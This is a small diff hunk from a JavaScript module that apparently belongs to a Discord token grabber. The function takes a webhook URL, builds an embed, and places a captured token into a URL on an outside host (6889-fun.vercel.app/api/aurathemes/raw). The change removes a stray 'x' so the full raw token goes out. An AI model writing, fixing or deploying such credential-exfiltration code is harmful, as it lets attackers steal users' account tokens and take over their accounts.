@@ -228,7 +228,7 @@ module.exports = async (webhookUrl) => {
                 avatar = `https://cdn.discordapp.com/embed/avatars/5.png`;
             }
 
-            let copy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=x${token}`;
+            let copy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=${token}`;
 
             const data = {
                 embeds: [
